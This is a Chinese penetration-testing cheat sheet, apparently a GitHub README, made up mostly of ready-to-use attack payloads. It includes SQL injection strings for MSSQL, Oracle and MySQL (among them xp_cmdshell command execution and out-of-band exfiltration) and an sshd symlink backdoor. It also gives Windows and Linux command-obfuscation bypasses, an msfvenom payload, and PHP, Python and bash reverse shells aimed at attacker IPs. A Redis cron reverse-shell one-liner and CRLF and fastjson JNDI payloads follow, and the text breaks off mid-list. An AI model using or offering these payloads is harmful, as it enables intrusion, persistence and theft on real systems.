# 渗透相关语法

相关漏洞学习资料，利用方法和技巧合集 

web常见漏洞：
注入漏洞(HTML注入/代码注入/header头注入(CRLF)/sql注入/xml注入(xxe/wsdl))<br>
跨站XSS漏洞、安全配置错误、登录认证缺陷、越权、敏感信息泄露<br>
权限控制不严格、请求伪造 (CSRF)、使用了存在漏洞的组件、点击劫持、SSRF<br>




目录
---------------------------------------------------------

* [Hacking study](#渗透相关语法)
	* [信息收集](#信息收集)
		* [域名相关](#域名相关)
		* [指纹识别](#指纹识别)
		* [ip位置](#ip位置)
		* [备案查询](#备案查询)
		* [目录枚举](#目录枚举)
		* [github语法](#github语法)
		* [端口扫描](#端口扫描)
		* [其他](#其他)
	* [注入基础](#注入基础)
		* [mssql注入](#mssql注入)
			* [mssql布尔注入](#mssql布尔注入)
			* [mssql报错注入](#mssql报错注入)
			* [mssql_waf绕过](#mssql_waf绕过)
		* [oracle注入](#oracle注入)
			* [oracle联合查询](#oracle联合查询)
			* [Oracle报错注入](#Oracle报错注入)
			* [oracle带外注入](#oracle带外注入)
			* [oracle时间盲注](#oracle时间盲注)
		* [mysql注入](#mysql注入)
			* [mysql报错注入](#mysql报错注入)
	* [命令及后门相关](#命令及后门相关)
		* [开3389](#开3389)
		* [运行计划任务](#运行计划任务)
		* [IPC入侵](#IPC入侵)
		* [nmap命令](#nmap命令)
		* [sshd软链接后门](#sshd软链接后门)
		* [lsof命令](#lsof命令)
		* [linux命令bypass](#linux命令bypass)
		* [cmd命令bypass](#cmd命令bypass)
		* [msf命令](#msf命令)
			
	* [shell反弹](#shell反弹)
		* [php反弹shell](#php反弹shell)
		* [python反弹shell](#python反弹shell)
		* [bash反弹shell](#bash反弹shell)
	* [漏洞知识](#漏洞知识)
		* [Apache漏洞](#Apache漏洞)
			* [Apache_HTTPD_多后缀解析漏洞](#Apache_HTTPD_多后缀解析漏洞)
			* [Apache_HTTPD_换行解析漏洞](#Apache_HTTPD_换行解析漏洞)
			* [Apache_SSI_远程命令执行漏洞](#Apache_SSI_远程命令执行漏洞)
		* [rsync_未授权访问漏洞](#rsync_未授权访问漏洞)
		* [redis_未授权访问漏洞](#redis_未授权访问漏洞)
		* [axis_rce漏洞](#axis_rce漏洞)
		* [jolokia未授权漏洞](#jolokia未授权漏洞)
		* [CRLF_HTTP头注人](#CRLF_HTTP头注人)
		* [HPP_参数污染漏洞](#HPP_参数污染漏洞)
		* [阿里云accessKeyId利用](#阿里云accessKeyId利用)
		* [反序列化漏洞](#反序列化漏洞)
			* [php反序列化](#php反序列化)
			* [fastjson反序列化](#fastjson反序列化)
			* [jackson_databind反序列化](#jackson_databind反序列化)
	* [渗透流程思路](#渗透流程思路)
		* [登陆框](#登陆框)
		* [注册框](#注册框)
		* [密码找回](#密码找回)
		* [后台管理](#后台管理)
		* [评论区](#评论区)
		* [购买支付](#购买支付)
		* [抽奖_活动](#抽奖_活动)
		* [代金卷_优惠卷](#代金卷_优惠卷)
		* [订单](#订单)
	
## 信息收集

> **前端js代码进行审计发现的一些路径记得去测试访问**

### 域名相关

- 工具
```
subDomainsBrute：https://github.com/lijiejie/subDomainsBrute
Sublist3r
subfinder
dnsbrute：https://github.com/chuhades/dnsbrute
```
- 在线查询
```
https://d.chinacycc.com/index.php?m=login
http://z.zcjun.com/
https://phpinfo.me/domain/
```
- 查询域名信息
```
http://link.chinaz.com/
几个whois查询站点：Chinaz、Aliyun、Whois365 
```
### 指纹识别

- 查询web/系统指纹
```
https://www.ddosi.com/ 
https://whatweb.net/
https://www.zoomeye.org/
http://whatweb.bugscaner.com
http://www.yunsee.cn/
http://whatweb.bugscaner.com/look/ 
http://www.yunsee.cn/finger.html 
```

### ip位置

- 查询ip地理位置
```
https://www.ipip.net/
```
- 查询物联网等信息
```
https://www.oshadan.com/
```

### 备案查询

- 备案号查询
```
http://www.beianbeian.com/
```
- ssl证书查询
```
https://myssl.com/
https://censys.io/
```
- 搜索引擎查询
```
google，baidu，bing，fofa， 
shodan：https://www.shodan.io/ 
```

### 目录枚举
- 目录爆破（可以查看html源代码收集目录）
```
https://github.com/7kbstorm/7kbscan-WebPathBrute
dirsearch
御剑工具
Web敏感文件robots.txt、crossdomain.xml、sitemap.xml 
```

### github语法

- 通过github收集信息
``` 
"xxx.com" API_key
"xxx.com" secret_key
"xxx.com" aws_key
"xxx.com" Password 
"xxx.com" FTP
"xxx.com"  login 
"xxx.com" github_token
"api.xxx.com" 
```

- IP段收集
``` 
通过shodan来收集ip段，通过shodan来收集ip主要是利用shodan收集厂商特征ico
通过AS号收集ip段我们可以通过在线网站 https://bgp.he.net 来查厂商的所属ip段 
通过ip服务器查询：
webscan：http://www.webscan.cc/
微步：https://x.threatbook.cn/
netcraft：https://toolbar.netcraft.com/site_report 
```

### 端口扫描

- 端口查询
```
利用masscan来扫描全端口，再调用nmap来扫描端口开启的服务，扫完端口后我们可以写个脚本来解析nmap的扫描结果，将开放的端口提取出来 
```

### 其他

- 邮箱挖掘
```
通过TheHarvester可以进行邮箱挖掘 
```
- 厂商业务收集
```
除了web端的信息收集以外，app和公众号也是我们不可忽视的一点，很多大的漏洞往往就在app端或者公众号上，收集厂商app的方法，一般我是利用crunchbase来进行app的收集的，除了app，公众号也可以通过天眼查和微信自身的搜索功能进行收集的。 
利用云网盘搜索工具搜集敏感文件https://www.lingfengyun.com/ 
```
- 免费接码
```
http://www.smszk.com/
http://www.z-sms.com/
https://getfreesmsnumber.com/
https://www.freeonlinephone.org/
http://mail.bccto.me/
http://24mail.chacuo.net/
```
- 几个生成字典方式
```
https://github.com/rootphantomer/Blasting_dictionary
https://www.itxueke.com/tools/pass/#
http://xingchen.pythonanywhere.com/index
https://github.com/LandGrey/pydictor
https://www.somd5.com/download/dict/
```		
		
## 注入基础
> **mssql、mysql、oracle 相关注入基础语句** 

### mssql注入

#### mssql布尔注入

- 判断版本号
```
' aNd @@version LIKE '%2015%'--+	
```
- 如果存在，返回 true说明后台数据库是MSSQL，否则返回 false**
```
' and exists(select * from sysobjects)--+	
```
- 判断当前是否为sa
```
' and exists(select is_srvrolemember('sysadmin'))--+	
```
- 判断有没有xp_cmdshell扩展
```
' and (select count(*) FROM master. dbo.sysobjects Where xtype ='X' AND name = 'xp_cmdshell')>0--+	
```
- 恢复xp_cmdshell
```
';dbcc addextendedproc ("sp_oacreate","odsole70.dll")
';dbcc addextendedproc ("xp_cmdshell","xplog70.dll")
或
';exec sp_addextendedproc xp_cmdshell,@dllname ='xplog70.dll'--+
```
- 开启xp_cmdshell
```
;EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE--+
```
- 命令执行
```
';exec master..xp_cmdshell 'net user'--+	
' and 1=(select * from openrowset('sqloledb','trusted_connection=yes','set fmtonly off exec master..xp_cmdshell ''net user'''))--+
```
- 创建一个包含两个字段t1的cmd_sql表
```
'; CREATE TABLE cmd_sql (t1 varchar(8000))--+
将执行结果存入t1中
';+insert into cmd_sql(t1) exec master..xp_cmdshell 'net user'--+
```
- 开启3389端口
```
';exec master..xp_cmdshell 'REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f'--+	
```

#### mssql报错注入

- 查看版本号
```
file_name(@@version)
```
- 变换N的值就可以爆出所有数据库的名称
```
' and (convert(int,db_name(N)))>0--+ 
```
- 查看当前用户
```
' and (user)>0--+ 	
' and 1=(select CAST(USER as int))--+
```
- 获取当前数据库
```
' and 1=(select db_name())--+
```
- 获取数据库该语句是一次性获取全部数据库，且语句只适合>=2005
```
' and 1=(select quotename(name) from master..sysdatabases FOR XML PATH(''))--+
' and 1=(select '|'%2bname%2b'|' from master..sysdatabases FOR XML PATH(''))--+
```
- 获取数据库所有表（只限于mssql2005及以上版本）
```
' and 1=(select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--+
' and 1=(select '|'%2bname%2b'|' from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--+
' and 1=(select top 1 name from sysobjects where xtype='u' and name <> '第一个数据库表名')--+
```
- 一次性爆N条所有字段的数据（只限于mssql2005及以上版本）
```
' and 1=(select top N * from 指定数据库..指定表名 FOR XML PATH(''))--+
' and 1=(select top 1 * from 指定数据库..指定表名 FOR XML PATH(''))--+
```
- 暴表
```
' and 1=convert(int,(select top 1 table_name from information_schema.tables))--+
```

#### mssql_waf绕过

- 获取版本和数据库名
```
'%1eaNd%1e@@version LIKE '%2015%'--+	
'%1eoR%1e1=(db_name/**/()%1e)%1e--+
```
- 获取全部数据库
```
'%1eoR%1e1=(SelEct/*xxxxxxxxxxxx*/%1equotename(name)%1efRom master%0f..sysobjects%1ewHerE%1extype='U' FOR XML PATH(''))%1e--
```
- 获取表的所有列
```
'%1eaND%1e1=(SelEct/*xxxxxxxxxxxx*/%1equotename/**/(name)%1efRom 数据库名%0f..syscolumns%1ewHerE%1eid=(selEct/*xxxxxxxxx*/%1eid%1efrom%1e数据库名%0f..sysobjects%1ewHerE%1ename='表名')%1efoR%1eXML%1ePATH/**/(''))%1e-
```

### oracle注入

#### oracle联合查询

- 判断是否oracle，在mssql和mysql以及db2内返回长度值是调用len()函数；在oracle和INFORMIX则是length()
```
' and len('a')=1--+
```
- 获取当前数据库用户
```
' and 1=2 union select null,(select banner from sys.v_$version where rownum=1),null from dual--+
```
- 爆当前数据库中的第二个表
```
' and 1=2 union select 1,(select table_name from user_tables where rownum=1 and table_name not in ('第一个表')) from dual--+
```
- 爆某表中的第一个字段
```
' and 1=2 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='表名（大写的）') from dual--+
```

#### Oracle报错注入

- 获取当前数据库用户
```
' and 1=ctxsys.drithsx.sn(1,(select user from dual))--+
' and 1=utl_inaddr.get_host_name((select user from dual))--+
' and 1=(select decode(substr(user,1,1),'S',(1/0),0) from dual)--+
' and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)--+
' and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null--+
' and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null--+
' and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null--+
' and (select dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null--+
' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null--+
```

#### oracle带外注入

- 获取当前数据库用户
```
' and (select utl_inaddr.get_host_address((select user from dual)||'.xxx.xxx') from dual) is not null--+
```
- 获取版本信息
```
' and 1=utl_http.request('.xxx.xxxx'||(select banner from sys.v_$version where rownum=1))--+
' and (select SYS.DBMS_LDAP.INIT((select user from dual)||'.xxxx.xxxx') from dual) is not null--+
```

#### oracle时间盲注

- 获取当前用户
```
' and 1=(DBMS_PIPE.RECEIVE_MESSAGE('a',10))--+
' AND 7238=(CASE WHEN (ASCII(SUBSTRC((SELECT NVL(CAST(USER AS VARCHAR(4000)),CHR(32)) FROM DUAL),1,1))>96) THEN DBMS_PIPE.RECEIVE_MESSAGE(CHR(71)||CHR(106)||CHR(72)||CHR(73),1) ELSE 7238 END)
```

### mysql注入

#### mysql报错注入

- 获取当前数据库用户
```
1' and extractvalue(1,concat(0x7e,(select user()),0x7e))--+
1' and updatexml(1,concat(0x7e,(select user()),0x7e),1)--+
1' and (select count(*) from information_schema.tables group by concat(select user(),0x7e，floor(rand(0)*2)))--+
1' or+1+group+by+concat_ws(0x7e,user(),floor(rand(0)*2))+having+min(0)+or+1
' and (select 1 from (select count(*),concat((select user()),floor(rand()*2))a from information_schema.columns group by a)b)limit 0,1--+
```
- 获取当前所有数据库
```
1' and (select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)

```
- 获取当前所有表
```
1' and (select 1 from(select count(),concat((select (select (SELECT distinct concat(0x7e,table_name,0x7e) FROM information_schema.tables where table_schema=database() LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)2))x from information_schema.tables group by x)a)

```

## 命令及后门相关
> **后门命令及常用渗透命令** 

### 开3389
```
sc config termservice start= auto
net start termservice
允许外连
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f 
-------------------------------------------
echo Windows Registry Editor Version 5.00>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]>>3389.reg 
echo "fDenyTSConnections"=dword:00000000>>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]>>3389.reg 
echo "PortNumber"=dword:00000d3d>>3389.reg 
echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]>>3389.reg 
echo "PortNumber"=dword:00000d3d>>3389.reg
之后执行
regedit /s 3389.reg
```

### 运行计划任务
```
使用administrator创建以system用户身份运行程序的计划任务，可以运行如远控或msf后门等
命令： 
schtasks /create /tn "system" /tr C:\Windows\system321.exe\system321.exe /sc MINUTE /mo 1  /ru "System" /RL HIGHEST

参数说明： 
/create #创建任务 
/tn "system"     #指定任务名称为system 
/tr C:\Windows\system321.exe\system321.exe     #指定程序路径 
/sc MINUTE /mo 1     #指定类型；MINUTE表示任务每n分钟运行一次，/mo 1表示每1分钟执行一次
/ru "System"     #指定为system用户运行该任务 
/RL HIGHEST     #运行级别，HIGHEST为使用最高权限运行
```

### IPC入侵
```
net share 查看本地开启的共享 
net share ipc$ 开启ipc$共享 
net use \\ip\ipc$ "" /user:"" 	建立IPC空链接 
net use \\ip\ipc$ "密码" /user:"用户名" 	建立IPC非空链接 
net use h: \\ip\c$ "密码" /user:"用户名" 	直接登陆后映射对方C：到本地为H: 
net use \\ip\ipc$ /del 	删除IPC链接 
net use h: /del 	删除映射对方到本地的为H:的映射 
net time \127.0.0.25         #查时间
at \\ip time 程序名(或一个命令) /r 	在某时间运行对方某程序并重新启动计算机
at \\127.0.0.25 10:50 srv.exe  #用at命令在0点50分启动srv.exe（注意这里设置的时间要比主机时间快）
at \\127.0.0.25 10:50 "echo 5 > c:\t.txt" 在远程计算机上建立文本文件t.txt； 
copy srv.exe \\hacden-pc\c$    #复制srv.exe到目标c盘上去 
```

### nmap命令
```
查询在线主机
nmap -sn 192.168.56.0/24

端口和服务
nmap -sS -sV -T5 -A -p- 192.168.0.109

```

### sshd软链接后门
```
1、服务端执行
ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oport=12345
ln -sf /usr/sbin/sshd /tmp/chsh;/tmp/chsh -oport=12345
ln -sf /usr/sbin/sshd /tmp/chfn;/tmp/chfn -oport=12345

2、客户端执行
ssh root@x.x.x.x -p 12345

#输入任意密码就可以root用户权限登陆了，如果root用户被禁止登陆时，可以利用其他存在的用户身份登陆，比如：ubuntu

检测
1、查看可疑端口
netstat -antlp
2、查看可执行文件
ls -al /tmp/su
清除
1、禁止PAM认证
vim /etc/ssh/sshd_config
UsePAM no
2、重载
/etc/init.d/sshd reload

```

### lsof命令
```
列出某个用户打开文件的信息：
lsof -u username

列出以进程号打开的文件： 
lsof -p 1,234

列出所有网络连接：
lsof -i 

列出所有tcp连接：
lsof -i tcp 

查出22端口现在运行什么程序： 
lsof -i :22

列出谁在使用某个端口：
lsof -i tcp:3389

列出某个用户所有活跃的网络连接：
lsof -a -u username -i
```

### linux命令bypass
```
使用反斜杠
w\ho\am\i

空格绕过
使用<和>
cat<>flag
cat<1.sh 
使用特殊变量:$IFS
cat$IFS\flag
cat${IFS}flag

使用特殊变量${9}
${9}对应空字符串关键字过滤绕过，使用$*和$@，$x(x代表1-9),${x}(x>=10)
ca$*t  flag
ca$@t flag
ca$2t flag
ca${11} flag

花括号还有一种用法：{command,argument}
{cat,flag}

使用双引号和单引号
ca"t" 1.sh
ca't' 1.sh

使用base64
echo 'Y2F0IC4vZmxhZwo=' |base64 -d |bash

使用进制
$(printf '\x00\x00\x00\x00\x00')
使用%0a(\n)，%0d(\r)，%09(\t)等字符也可以bypass

突破终端限制执行脚本内容：
man -P /tmp/runme.sh man

突破终端限制执行脚本中的命令：
tar cvzf a.tar.gz --checkpoint-action=exec=./a.sh --checkpoint=1 a.sh 
tar c a.tar -I ./runme.sh a

CVE-2014-6271
env X='() { :; }; echo "CVE-2014-6271 vulnerable"' bash -c id 

awk执行系统命令三种方法：
awk 'BEGIN{system("echo abc")}' 
awk 'BEGIN{print "echo","abc"| "/bin/bash"}' 
awk '{"date"| getline d; print d; close("d")}'
```

### cmd命令bypass
```
逗号------------net user
,;,%coMSPec:~ -0, +27%,; ,;, ;/b, ;;; ,/c, ,,, ;start; , ; ;/b ; , /min ,;net user

括号-----------netstat /ano | findstr LISTENING
,;,%coMSPec:~ -0, +27%,; ,;, ;/b, ;;; ,/c, ,,, ;start; , ; ;/b ; , /min ,;netstat -ano |; ,;( (,;,((findstr LISTENING)),;,) )

转义字符------------netstat /ano | findstr LISTENING
,;,%coMSPec:~ -0, +27%,; ,;, ;^^^^/^^^^b^^^^, ;;; ,^^^^/^c, ,,, ;^^st^^art^^; , ; ;/^^^^b ; , ^^^^/^^^^min ,;net^^^^stat ^^^^ ^^^^-a^^^^no ^^^^ ^|; ,;( ^ (,;^,(^(fi^^^^ndstr LIST^^^^ENING)^),;^,) ^ )

设置环境变量------
#cmd /c "set com3= &&set com2=user&&set com1=net &&call %com1%%com2%%com3%"
#cmd /c "set com3= /ano&&set com2=stat&&set com1=net&&call %com1%%com2%%com3%"
#cmd /c "set com3= &&set com2=user&&set com1=net &&call set final=%com1%%com2%%com3%&&call %final%"

随机大小写-------
CMd /C "sEt coM3= /ano&& SEt cOm2=stat&& seT CoM1=net&& caLl SeT fiNAl=%COm1%%cOm2%%coM3%&& cAlL %FinAl%"

逗号和分号---------
;,,CMd,; ,/C ", ;, ;sEt coM3= &&,,,SEt cOm2=user&&;;;seT CoM1=net &&, ;caLl,;,SeT fiNAl=%COm1%%cOm2%%coM3%&&; , ,cAlL, ;, ;%FinAl%"

将配对双引号添加到输入命令以混淆其最终命令行参数
;,,C^Md^,; ,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n^^e””t) ) &&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (,,(c^AlL^, ;,^ ;%Fi^nAl^%))"

使用cmd.exe的/ V：ON参数启用延迟环境变量扩展
;,,C^Md^,; /V:ON,^/^C^ ^ ", ( ((;,( ;(s^Et ^ ^ co^M3=^^ /^^an^o)) )))&&,,(,S^Et^ ^ ^cO^m2=^s^^ta^^t)&&(;(;;s^eT^ ^ C^oM1^=^n^^””e””t) ) &&set quotes=””&&, (( ;c^aLl,^;,S^e^T ^ ^ fi^NAl^=^%COm1^%%c^Om2%^%c^oM3^%))&&; (, ,(c^AlL^, ;,^ ;%Fi^nAl^%) )"

```

### msf命令
```
生成exe文件
msfveom -p windows/metepreter/reverse_tcp -a x86 --platform windows LHOST=192.168.43.63 LPORT=4444 -e x86/shikata_ga_nai -i 20 PrependMigrate=true -f exe >ma.exe

攻击3389致使蓝屏：
扫描
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids

永恒之蓝漏洞拿cmd：
扫描
use auxiliary/scanner/smb/smb_ms17_010 
攻击
use exploit/windows/smb/ms17_010_eternalblue 	攻击win7-2003
use exploit/windows/smb/ms17_010_eternalblue_win8 	攻击win8
```

## shell反弹
> **反弹shell基本语句** 

### php反弹shell
```
攻击机监听
nc -lvvp 4444

要求目标机器有php然后执行
php -r '$sock=fsockopen("192.168.23.88",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

```

### python反弹shell
```
代码
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.56.104",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/bash","-i"])

受害机执行
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.104",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

攻击机执行
nc -lvvp 5555

交互shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

### bash反弹shell
```
攻击机
nc -lvvp 4444

受害机
bash -i >& /dev/tcp/47.98.229.211/4444 0>&1
```


## 漏洞基础
> **Apache、** 

### Apache漏洞
> **Apache相关漏洞概述** 

#### Apache_HTTPD_多后缀解析漏洞
```
条件：httpd.conf中配置如下：AddHandler application/x-httpd-php .php

那就可以通过上传文件名为xxx.php.jpg或xxx.php.jpeg的文件进行getshell

```
#### Apache_HTTPD_换行解析漏洞
```
条件：2.4.0~2.4.29版本（CVE-2017-15715），以hex形式在数据包中的xxx.php后添加0a，放包后浏览器访问 xxx.php%0a 进行getshell


上传的数据包：
------WebKitFormBoundary38LloOXE0KEPGEGk
Content-Disposition: form-data; name="file"; filename="1.jpg"
Content-Type: application/octet-stream

<?php
phpinfo();  
?>
------WebKitFormBoundary38LloOXE0KEPGEGk
Content-Disposition: form-data; name="name"

xxx.php

------WebKitFormBoundary38LloOXE0KEPGEGk--

```
#### Apache_SSI_远程命令执行漏洞
```
条件：服务器开启了SSI与CGI支持，那么可以上传一个 xxx.shtml 文件来执行任意命令

xxx.shtml内容：
<!--#exec cmd="whoami" -->

上传xxx.shtml完成后，直接浏览器访问 xxx.shtml 即可执行whoami命令
```

### rsync_未授权访问漏洞
```
查看远程tarket-ip的模块名列表:
rsync rsync://tarket-ip:873/

列出path模块下的文件：
rsync rsync://tarket-ip:873/path/

下载任意文件到本地 ./ 下：
rsync -av rsync://tarket-ip:873/path/etc/passwd ./

上传任意文件：
rsync -av shell rsync://tarket-ip:873/path/etc/cron.d/shell
```
### redis_未授权访问漏洞
```
一行命令计划任务反弹shell：
(sleep 1;echo "info";sleep 2;echo "set x \"\n* * * * * bash -i >& /dev/tcp/vps_ip/8888 0>&1\n\"";sleep 1;echo "config get dir";sleep 2;echo "config get dbfilename";sleep 2;echo "config set dir /var/spool/cron";sleep 1;echo "config set dbfilename root";sleep 1;echo "save";sleep 1;echo "exit")|telnet target 6379

ssh秘钥写入
ssh-keygen -t rsa   # 然后目录下生成2个文件 私钥:id_rsa 公钥:id_rsa.pub
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > temp.txt
cat temp.txt #生成的ssh_payload
(sleep 1;echo "info";sleep 2;echo "set x \"复制生成的ssh_payload\"";sleep 1;echo "config get dir";sleep 2;echo "config get dbfilename";sleep 2;echo "config set dir  /root/.ssh/";sleep 1;echo "config set dbfilename authorized_keys";sleep 1;echo "save";sleep 1;echo "exit")|telnet target 6379
ssh root@target -i id_rsa #本地连接即可

```
### axis_rce漏洞
漏洞利用脚本：
- [hacden/axis_enable_remote](https://github.com/hacden/Hack/blob/master/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/axis_enable_remote.py)
```
参考：https://xz.aliyun.com/t/7981
```
### jolokia未授权漏洞
```
另利用方法：
POST /jolokia/ HTTP/1.1
Host: localhost:10007
Content-Type: application/json
Content-Length: 206

{
    "type" : "read",
    "mbean" : "java.lang:type=Memory",
    "target" : { 
         "url" : "service:jmx:rmi:///jndi/ldap://localhost:9092/jmxrmi"
    } 
}
或
POST /jolokia/ HTTP/1.1
Host: localhost:10007
Content-Type: application/json
Content-Length: 206

{
    "type" : "read",
    "mbean" : "java.lang:type=Memory",
    "target" : { 
         "url" : "service:jmx:rmi:///jndi/rmi://localhost:9092/jmxrmi"
    } 
}
参考：https://xz.aliyun.com/t/2294
```
### CRLF_HTTP头注人
> **多出现于302跳转类型,观察url或参数是否存在于返回包中**
```
1、如访问/test.php?www.xxx.com，，如果存在可如下xss payload测试：
/test.php?www.xxx.com%%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><script>alert(/crlf/)</script></html>

2、Cookie会话固定：
%0a%0d%0a%0dSet-cookie:JSPSESSID%3Dxxx
%0d%0a%09Set-cookie:%20xxx

3、测试payload
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28crlf%28%29%E5%98%BE
%2f%2e%2e%0d%0aheader:header
%23%0dheader:header
%3f%0dheader:header
/%250aheader:header
/%%0a0aheader:header
/%3f%0dheader:header
/%23%0dheader:header
/%25%30aheader:header
/%25%30%61header:header
/%u000aheader:header
```
### HPP_参数污染漏洞
```
重复提交参数产生奇效

1、敏感操作
https://www.example.com/transferMoney.php?amount=1000&fromAccount=12345
进行转账操作，原本链接中是没有toAccount参数的，这个参数是后端固定的，但如果我们重复提交这个参数：
https://www.example.com/transferMoney.php?amount=1000&fromAccount=12345&toAccount=99999
会覆盖后端请求，从而服务器取到的是toAccount=99999这个值。

2、IDOR（不安全的对象引用）
发邮件功能，我8888用户发邮件给对方12345用户
https://www.example.com/transferMail.php?myId=8888&targetId=12345
当不适应HPP时仅仅修改如下，即想让对方12345发邮件给我8888，进行鉴权显然会请求错误
https://www.example.com/transferMail.php?myId=12345&targetId=8888
使用HPP时，如下添加了两个myId参数，鉴权取到了myId=8888 通过，发邮件时取到了myId=12345这个值，从而让对方12345用户发邮件给了我8888用户
https://www.example.com/transferMail.php?myId=12345&myId=8888&targetId=8888

3、社交分享链接
把内容分享到其他社交媒体，如下：
https://www.example.com/id=1，分享到FB上链接为：https://www.facebook.com/sharer.php?u=https://www.example.com/id=1
使用HPP时，如下添加了两个u参数，则最终的跳转会成为https://hackder.com/：
https://www.facebook.com/sharer.php?u=https://www.example.com/id=1&u=https://hackder.com/

4、权限操作
用户只能进行查看操作，如下：
https://www.example.com/info.php?action=view&par=12345
使用HPP时后面再添加一个action参数，如：?&action=edit，最后取到了edit，导致可以提升权限进行编辑了
https://www.example.com/info.php?action=view&par=12345?&action=edit

```
### 阿里云accessKeyId利用
漏洞利用工具：
- [iiiusky/alicloud-tools](https://github.com/iiiusky/alicloud-tools/releases/tag/v1.0.1)
```
Laravel站点：可尝试post提交访问，如果存在debug模式可把阿里云accessKeyId和accessSecret爆出来
其他信息泄露获取：内网配置文件等
之后使用工具：alicloud-tools进行利用api执行命令 或 OSS浏览文件 或 行云管家管理云主机

```

### 反序列化漏洞

#### php反序列化
> **php常见魔法函数**
```
__wakeup() 
//使用unserialize时触发,需要绕过时可增加属性的值如：由O:4:"Demo":1:{s:4:"file";s:8:"flag.php";}修改为O:4:"Demo":9999:{s:4:"file";s:8:"flag.php";}

__sleep() 
//使用serialize时触发，如$s = serialize($obj); obj对象被序列化时将优先调用__sleep()方法

__destruct() 
//脚本运行结束后_destruct函数被触发

__construct() 
//类一执行就开始调用，其作用是拿来初始化一些值。

__call() 
//在对象上下文中调用不可访问的函数时触发，如：类中的函数调用不存在的函数时而调用__call()

__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发

__toString() 
//把类当作字符串使用时触发，如用户可控：echo unserialize($_GET['usr_serialized']);首先会被反序列化，先调用了__wakeup()方法，之后被反序列化出来的对象又被当做字符串输出，又调用了__toString()方法，所以总共调用了两次魔法函数。

__invoke() 
//以调用函数的方式调用一个对象时__invoke()方法会被自动调用，如：$obj = new class(); 以$obj()这种函数形式调用时将调用__invoke()方法
```
#### fastjson反序列化
> **fastjson反序列化payload集合**
```
{"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://fastjson_1.2.24.localhost/fastjson_1.2.24", "autoCommit": true}

{"name": {"@type":"java.lang.Class","val": "com.sun.rowset.JdbcRowSetImpl"},"x": {"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": rmi://fastjson_1.2.47.localhost/fastjson_1.2.47","autoCommit": true}}}

{"@type": "org.apache.xbean.propertyeditor.JndiConverter","AsText": "rmi://fastjson_1.2.62.localhost/fastjson_1.2.62"}

{"@type": "oracle.jdbc.connector.OracleManagedConnectionFactory ","dataSourceName": "rmi://fastjson_1.2.62_2.localhost/fastjson_1.2.62_2"}

{"@type": "com.caucho.config.types.ResourceRef", "lookupName": "ldap://jackson_fastjson_10673.localhost/jackson_fastjson_10673"}

{"@type":"com.zaxxer.hikari.HikariConfig","metricRegistry":"ldap://jackson_fastjson_14540.localhost/jackson_fastjson_14540"}

// 基于spring框架的field
{"@type": "org.springframework.beans.factory.config.PropertyPathFactoryBean","targetBeanName": "rmi://localhost/Exploit","propertyPath": "foo","beanFactory": {"@type": "org.springframework.jndi.support.SimpleJndiBeanFactory","shareableResources": ["rmi://spring_field.localhost/spring_field"]}}

// 基于JndiRefForwardingDataSource
{"@type": "com.mchange.v2.c3p0.JndiRefForwardingDataSource","jndiName": "rmi://JndiRefForwardingDataSource.localhost/JndiRefForwardingDataSource","loginTimeout": 0}

// 基于JndiDataSourceFactoryDataSource
{"@type": "org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties": {"data_source": "rmi://JndiDataSourceFactory.localhost/JndiDataSourceFactory"}}

// 基于StatisticsService
